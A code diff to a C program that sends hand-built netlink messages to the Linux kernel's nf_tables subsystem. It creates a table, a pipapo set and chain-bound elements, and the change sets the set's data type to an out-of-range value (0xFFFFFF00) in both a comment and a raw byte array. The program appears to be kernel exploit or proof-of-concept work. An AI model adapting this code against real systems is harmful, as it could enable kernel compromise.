@@ -403,7 +403,7 @@ void create_pipapo_set_flags(int sock){
         "NFTA_SET_ID":0,
         "NFTA_SET_KEY_LEN":12,
         "NFTA_SET_FLAGS":140,
-        "NFTA_SET_DATA_TYPE":0,
+        "NFTA_SET_DATA_TYPE":4294967040,
         "NFTA_SET_DATA_LEN":16,
         "NFTA_SET_DESC":{
             "NFTA_SET_DESC_CONCAT":{
@@ -436,7 +436,7 @@ void create_pipapo_set_flags(int sock){
 
 
     /* nft_set: INTERVAL | MAP | CONCAT (0x8c == 140), with DATA_TYPE + DATA_LEN */
-    uint8_t msgcon1[] = {1,0,0,0,12,0,1,0,109,121,95,116,97,98,108,101,12,0,2,0,109,121,95,115,101,116,64,64,8,0,10,0,0,0,0,0,8,0,5,0,0,0,0,12,8,0,3,0,0,0,0,140,8,0,6,0,0,0,0,0,8,0,7,0,0,0,0,16,32,0,9,128,28,0,2,128,12,0,1,128,8,0,1,0,0,0,0,4,12,0,1,128,8,0,1,0,0,0,0,8};
+    uint8_t msgcon1[] = {1,0,0,0,12,0,1,0,109,121,95,116,97,98,108,101,12,0,2,0,109,121,95,115,101,116,64,64,8,0,10,0,0,0,0,0,8,0,5,0,0,0,0,12,8,0,3,0,0,0,0,140,8,0,6,0,255,255,255,0,8,0,7,0,0,0,0,16,32,0,9,128,28,0,2,128,12,0,1,128,8,0,1,0,0,0,0,4,12,0,1,128,8,0,1,0,0,0,0,8};
     memcpy((void *)nlh1+0x10, msgcon1, pay1_size);
 
     nlh_batch_end = get_batch_end_nlmsg();
@@ -1339,7 +1339,8 @@ int main(){
 
     create_table(sock, "my_table");
     create_pipapo_set_flags(sock);
-    create_binding_chain(sock);
+    //create_binding_chain(sock);
+    create_chain(sock, "my_table", "my_chain");
     add_set_elem_bind_chain(sock);
     
         
